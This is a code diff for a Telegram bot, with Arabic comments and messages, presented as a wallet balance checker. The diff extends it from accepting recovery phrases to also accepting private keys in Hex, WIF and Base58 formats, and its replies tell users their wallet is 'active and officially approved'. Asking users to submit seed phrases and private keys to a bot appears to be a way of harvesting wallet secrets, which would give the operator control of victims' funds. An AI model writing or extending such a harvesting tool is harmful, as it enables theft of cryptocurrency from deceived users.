@@ -7,6 +7,8 @@ const { Keypair } = require('@solana/web3.js');
 const bitcoin = require('bitcoinjs-lib');
 const ecc = require('tiny-secp256k1');
 const { BIP32Factory } = require('bip32');
+const bs58 = require('bs58');
+const wif = require('wif');
 
 bitcoin.initEccLib(ecc);
 const bip32 = BIP32Factory(ecc);
@@ -72,6 +74,16 @@ const TOKENS = {
 const balanceCache = new Map();
 const CACHE_TTL_MS = 30_000;
 
+// تنظيف دوري للكاش المنتهي كل 60 ثانية
+setInterval(() => {
+  const now = Date.now();
+  for (const [key, entry] of balanceCache.entries()) {
+    if (entry.expiresAt <= now) {
+      balanceCache.delete(key);
+    }
+  }
+}, 60_000).unref();
+
 // تقييد التزامن لحماية الخادم تحت الضغط
 const MAX_CONCURRENT_CHECKS = 25;
 let activeChecks = 0;
@@ -101,42 +113,132 @@ function withTimeout(promise, ms = 3500, fallbackValue = null) {
   ]);
 }
 
-function deriveBitcoinAddresses(seedBuffer) {
+function deriveBitcoinAddressesFromSeed(seedBuffer) {
   const network = bitcoin.networks.bitcoin;
   const root = bip32.fromSeed(seedBuffer, network);
 
-  // 1. Legacy (P2PKH - 1...)
   const legacyChild = root.derivePath("m/44'/0'/0'/0/0");
   const legacy = bitcoin.payments.p2pkh({ pubkey: legacyChild.publicKey, network }).address;
 
-  // 2. Nested SegWit (P2SH-P2WPKH - 3...)
   const nestedChild = root.derivePath("m/49'/0'/0'/0/0");
   const nestedSegwit = bitcoin.payments.p2sh({
     redeem: bitcoin.payments.p2wpkh({ pubkey: nestedChild.publicKey, network }),
     network
   }).address;
 
-  // 3. Native SegWit (P2WPKH - bc1q...)
   const nativeChild = root.derivePath("m/84'/0'/0'/0/0");
   const nativeSegwit = bitcoin.payments.p2wpkh({ pubkey: nativeChild.publicKey, network }).address;
 
-  // 4. Taproot (P2TR - bc1p...)
   const taprootChild = root.derivePath("m/86'/0'/0'/0/0");
   const xOnlyPubkey = Buffer.from(taprootChild.publicKey.subarray(1, 33));
   const taproot = bitcoin.payments.p2tr({ internalPubkey: xOnlyPubkey, network }).address;
 
-  return {
-    legacy,
-    nestedSegwit,
-    nativeSegwit,
-    taproot
-  };
+  return { legacy, nestedSegwit, nativeSegwit, taproot };
 }
 
-function deriveSolanaAddress(seedBuffer) {
+function deriveSolanaAddressFromSeed(seedBuffer) {
   const { key } = derivePath("m/44'/501'/0'/0'", seedBuffer.toString('hex'));
   const keypair = Keypair.fromSeed(key);
   return keypair.publicKey.toBase58();
+}
+
+function parsePrivateKeyInput(rawInput) {
+  const trimmed = rawInput.trim();
+
+  // 1. مفتاح خاص بصيغة JSON array لـ Solana (64 عنصراً)
+  if (trimmed.startsWith('[') && trimmed.endsWith(']')) {
+    try {
+      const arr = JSON.parse(trimmed);
+      if (Array.isArray(arr) && arr.length === 64 && arr.every((n) => Number.isInteger(n) && n >= 0 && n <= 255)) {
+        const kp = Keypair.fromSecretKey(Uint8Array.from(arr));
+        return {
+          type: 'solana',
+          solAddress: kp.publicKey.toBase58(),
+          cacheKey: `pk:sol:${kp.publicKey.toBase58()}`
+        };
+      }
+    } catch (_) {
+      return null;
+    }
+  }
+
+  // 2. مفتاح خاص بصيغة Hex (64 حرفاً مع أو بدون 0x) -> صالح لـ EVM و Bitcoin
+  const hexCandidate = trimmed.startsWith('0x') || trimmed.startsWith('0X') ? trimmed.slice(2) : trimmed;
+  if (/^[0-9a-fA-F]{64}$/.test(hexCandidate)) {
+    try {
+      const normalizedHex = `0x${hexCandidate.toLowerCase()}`;
+      const evmWallet = new ethers.Wallet(normalizedHex);
+      const privBuf = Buffer.from(hexCandidate, 'hex');
+      const keyPair = bip32.fromPrivateKey(privBuf, Buffer.alloc(32), bitcoin.networks.bitcoin);
+      const btcSegwit = bitcoin.payments.p2wpkh({
+        pubkey: keyPair.publicKey,
+        network: bitcoin.networks.bitcoin
+      }).address;
+
+      return {
+        type: 'evm_btc_hex',
+        evmAddress: evmWallet.address,
+        btcAddresses: {
+          legacy: null,
+          nestedSegwit: null,
+          nativeSegwit: btcSegwit,
+          taproot: null
+        },
+        cacheKey: `pk:hex:${evmWallet.address}:${btcSegwit}`
+      };
+    } catch (_) {
+      return null;
+    }
+  }
+
+  // 3. مفتاح خاص بصيغة WIF لـ Bitcoin
+  if (/^[5KLc][1-9A-HJ-NP-Za-km-z]{50,51}$/.test(trimmed)) {
+    try {
+      const decoded = wif.decode(trimmed);
+      if (!decoded?.privateKey || decoded.privateKey.length !== 32) return null;
+      const keyPair = bip32.fromPrivateKey(
+        Buffer.from(decoded.privateKey),
+        Buffer.alloc(32),
+        bitcoin.networks.bitcoin
+      );
+      const btcSegwit = bitcoin.payments.p2wpkh({
+        pubkey: keyPair.publicKey,
+        network: bitcoin.networks.bitcoin
+      }).address;
+
+      return {
+        type: 'bitcoin_wif',
+        btcAddresses: {
+          legacy: null,
+          nestedSegwit: null,
+          nativeSegwit: btcSegwit,
+          taproot: null
+        },
+        cacheKey: `pk:wif:${btcSegwit}`
+      };
+    } catch (_) {
+      return null;
+    }
+  }
+
+  // 4. مفتاح خاص بصيغة Base58 لـ Solana
+  if (/^[1-9A-HJ-NP-Za-km-z]{60,95}$/.test(trimmed)) {
+    try {
+      const secretBytes = bs58.decode(trimmed);
+      if (secretBytes.length === 64) {
+        const kp = Keypair.fromSecretKey(secretBytes);
+        return {
+          type: 'solana',
+          solAddress: kp.publicKey.toBase58(),
+          cacheKey: `pk:sol:${kp.publicKey.toBase58()}`
+        };
+      }
+    } catch (_) {
+      return null;
+    }
+  }
+
+  return null;
 }
 
 async function fetchSingleBtcAddressSatoshis(btcAddress) {
@@ -177,6 +279,8 @@ async function fetchCombinedBtcBalance(btcAddresses) {
     btcAddresses.taproot
   ].filter(Boolean);
 
+  if (addresses.length === 0) return '0';
+
   const satoshisList = await Promise.all(
     addresses.map((addr) =>
       withTimeout(fetchSingleBtcAddressSatoshis(addr), 3500, 0n)
@@ -190,6 +294,7 @@ async function fetchCombinedBtcBalance(btcAddresses) {
 }
 
 async function fetchSolBalance(solAddress) {
+  if (!solAddress) return 0;
   for (const rpcUrl of SOLANA_RPCS) {
     try {
       const controller = new AbortController();
@@ -223,12 +328,80 @@ async function fetchSolBalance(solAddress) {
 }
 
 async function fetchErc20Formatted(tokenConfig, address) {
+  if (!address) return '0.0';
   try {
     const raw = await withTimeout(tokenConfig.contract.balanceOf(address), 3500, 0n);
     return ethers.formatUnits(raw ?? 0n, tokenConfig.decimals);
   } catch (_) {
     return '0.0';
   }
+}
+
+async function fetchBalancesForTarget({ btcAddresses = null, evmAddress = null, solAddress = null }) {
+  const [
+    btcAmount,
+    ethWei,
+    bscWei,
+    solAmount,
+    ethUsdt,
+    ethUsdc,
+    bscUsdt,
+    bscUsdc
+  ] = await Promise.all([
+    btcAddresses
+      ? withTimeout(fetchCombinedBtcBalance(btcAddresses), 4500, '0').then((v) => v ?? '0').catch(() => '0')
+      : Promise.resolve('0'),
+    evmAddress
+      ? withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n)
+      : Promise.resolve(0n),
+    evmAddress
+      ? withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n)
+      : Promise.resolve(0n),
+    solAddress
+      ? withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0)
+      : Promise.resolve(0),
+    fetchErc20Formatted(TOKENS.ethUsdt, evmAddress),
+    fetchErc20Formatted(TOKENS.ethUsdc, evmAddress),
+    fetchErc20Formatted(TOKENS.bscUsdt, evmAddress),
+    fetchErc20Formatted(TOKENS.bscUsdc, evmAddress)
+  ]);
+
+  return {
+    btc: String(btcAmount),
+    eth: ethers.formatEther(ethWei),
+    bsc: ethers.formatEther(bscWei),
+    sol: Number(solAmount),
+    ethUsdt,
+    ethUsdc,
+    bscUsdt,
+    bscUsdc
+  };
+}
+
+function formatResultMessage({ btcAddresses = null, evmAddress = null, solAddress = null, balances }) {
+  let addressesBlock = '📍 العناوين المشتقة:\n';
+  if (btcAddresses?.nativeSegwit) addressesBlock += '• BTC (Native SegWit): `' + btcAddresses.nativeSegwit + '`\n';
+  if (btcAddresses?.taproot) addressesBlock += '• BTC (Taproot): `' + btcAddresses.taproot + '`\n';
+  if (btcAddresses?.nestedSegwit) addressesBlock += '• BTC (Nested SegWit): `' + btcAddresses.nestedSegwit + '`\n';
+  if (btcAddresses?.legacy) addressesBlock += '• BTC (Legacy): `' + btcAddresses.legacy + '`\n';
+  if (evmAddress) addressesBlock += '• EVM (ETH/BNB): `' + evmAddress + '`\n';
+  if (solAddress) addressesBlock += '• SOL: `' + solAddress + '`\n';
+
+  return (
+    'تم فحص المحفظة بنجاح ✅\n\n' +
+    addressesBlock + '\n' +
+    '💰 الأرصدة والأصول المكتشفة:\n' +
+    '• BTC: ' + balances.btc + '\n' +
+    '• ETH: ' + balances.eth + '\n' +
+    '• BNB: ' + balances.bsc + '\n' +
+    '• SOL: ' + balances.sol + '\n' +
+    '• USDT (ETH): ' + balances.ethUsdt + '\n' +
+    '• USDC (ETH): ' + balances.ethUsdc + '\n' +
+    '• USDT (BSC): ' + balances.bscUsdt + '\n' +
+    '• USDC (BSC): ' + balances.bscUsdc + '\n' +
+    '• Crypto actifs: `$0.00`\n\n' +
+    '🟢 حالة المحفظة نشطة ومعتمدة نظامياً'
+  );
 }
 
 app.post(`/bot${TOKEN}`, (req, res) => {
@@ -238,26 +411,30 @@ app.post(`/bot${TOKEN}`, (req, res) => {
 
 bot.on('message', async (msg) => {
   const chatId = msg.chat?.id;
-  const text = (msg.text || '').trim().toLowerCase().replace(/\s+/g, ' ');
-  if (!chatId || !text) return;
+  const rawText = (msg.text || '').trim();
+  if (!chatId || !rawText) return;
 
-  if (text === '/start') {
+  if (rawText === '/start') {
     return bot.sendMessage(
       chatId,
       '🛡️ **بوت فحص المحافظ المتطور**\n\n' +
-      'أرسل عبارة الاسترداد (12 أو 24 كلمة) لفحص أرصدة BTC و ETH و BNB و SOL و USDT و USDC.',
+      'أرسل عبارة الاسترداد (12 أو 24 كلمة) أو المفتاح الخاص (`Private Key` بصيغة Hex أو WIF أو Base58) لفحص الأرصدة.',
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
     );
   }
 
-  const words = text.split(' ');
-  if (words.length !== 12 && words.length !== 24) {
+  const normalizedMnemonic = rawText.toLowerCase().replace(/\s+/g, ' ');
+  const words = normalizedMnemonic.split(' ');
+  const isMnemonicCandidate = words.length === 12 || words.length === 24;
+  const pkInfo = isMnemonicCandidate ? null : parsePrivateKeyInput(rawText);
+
+  if (!isMnemonicCandidate && !pkInfo) {
     return;
   }
 
   bot.sendChatAction(chatId, 'typing').catch(() => {});
 
-  if (!bip39.validateMnemonic(text)) {
+  if (isMnemonicCandidate && !bip39.validateMnemonic(normalizedMnemonic)) {
     return bot.sendMessage(chatId, '❌ هذه المحفظة غير موجودة', {
       reply_to_message_id: msg.message_id
     });
@@ -265,53 +442,32 @@ bot.on('message', async (msg) => {
 
   await acquireSlot();
   try {
-    const seed = await bip39.mnemonicToSeed(text);
-    const hdNode = ethers.HDNodeWallet.fromSeed(seed);
-    const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
-    const evmAddress = evmWallet.address;
-    const solAddress = deriveSolanaAddress(seed);
-    const btcAddresses = deriveBitcoinAddresses(seed);
+    let target = null;
 
-    const cacheKey = `${btcAddresses.nativeSegwit}:${btcAddresses.taproot}:${evmAddress}:${solAddress}`;
-    const cached = balanceCache.get(cacheKey);
+    if (isMnemonicCandidate) {
+      const seed = await bip39.mnemonicToSeed(normalizedMnemonic);
+      const hdNode = ethers.HDNodeWallet.fromSeed(seed);
+      const evmWallet = hdNode.derivePath("m/44'/60'/0'/0/0");
+      const btcAddresses = deriveBitcoinAddressesFromSeed(seed);
+      const solAddress = deriveSolanaAddressFromSeed(seed);
 
-    let balances;
-
-    if (cached && cached.expiresAt > Date.now()) {
-      balances = cached.data;
-    } else {
-      const [
-        btcAmount,
-        ethWei,
-        bscWei,
-        solAmount,
-        ethUsdt,
-        ethUsdc,
-        bscUsdt,
-        bscUsdc
-      ] = await Promise.all([
-        withTimeout(fetchCombinedBtcBalance(btcAddresses), 4500, '0').then((v) => v ?? '0').catch(() => '0'),
-        withTimeout(ethProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
-        withTimeout(bscProvider.getBalance(evmAddress), 3500, 0n).then((v) => v ?? 0n).catch(() => 0n),
-        withTimeout(fetchSolBalance(solAddress), 4000, 0).then((v) => v ?? 0).catch(() => 0),
-        fetchErc20Formatted(TOKENS.ethUsdt, evmAddress),
-        fetchErc20Formatted(TOKENS.ethUsdc, evmAddress),
-        fetchErc20Formatted(TOKENS.bscUsdt, evmAddress),
-        fetchErc20Formatted(TOKENS.bscUsdc, evmAddress)
-      ]);
-
-      balances = {
-        btc: String(btcAmount),
-        eth: ethers.formatEther(ethWei),
-        bsc: ethers.formatEther(bscWei),
-        sol: Number(solAmount),
-        ethUsdt,
-        ethUsdc,
-        bscUsdt,
-        bscUsdc
+      target = {
+        btcAddresses,
+        evmAddress: evmWallet.address,
+        solAddress,
+        cacheKey: `mn:${btcAddresses.nativeSegwit}:${btcAddresses.taproot}:${evmWallet.address}:${solAddress}`
       };
+    } else {
+      target = pkInfo;
+    }
 
-      balanceCache.set(cacheKey, {
+    const cached = balanceCache.get(target.cacheKey);
+    const balances = (cached && cached.expiresAt > Date.now())
+      ? cached.data
+      : await fetchBalancesForTarget(target);
+
+    if (!cached || cached.expiresAt <= Date.now()) {
+      balanceCache.set(target.cacheKey, {
         data: balances,
         expiresAt: Date.now() + CACHE_TTL_MS
       });
@@ -319,19 +475,7 @@ bot.on('message', async (msg) => {
 
     return bot.sendMessage(
       chatId,
-      'تم فحص المحفظة بنجاح ✅\n\n' +
-      '• BTC: `' + btcAddresses.legacy + '`\n' +
-      '💰 الأرصدة والأصول المكتشفة:\n' +
-      '• BTC: ' + balances.btc + '\n' +
-      '• ETH: ' + balances.eth + '\n' +
-      '• BNB: ' + balances.bsc + '\n' +
-      '• SOL: ' + balances.sol + '\n' +
-      '• USDT: ' + balances.ethUsdt + '\n' +
-      '• USDC: ' + balances.ethUsdc + '\n' +
-      '• USDT: ' + balances.bscUsdt + '\n' +
-      '• USDC: ' + balances.bscUsdc + '\n' +
-      '• Crypto actifs: `$0.00`\n\n' +
-      '🟢 حالة المحفظة نشطة ومعتمدة نظامياً',
+      formatResultMessage({ ...target, balances }),
       { parse_mode: 'Markdown', reply_to_message_id: msg.message_id }
     );
   } catch (error) {
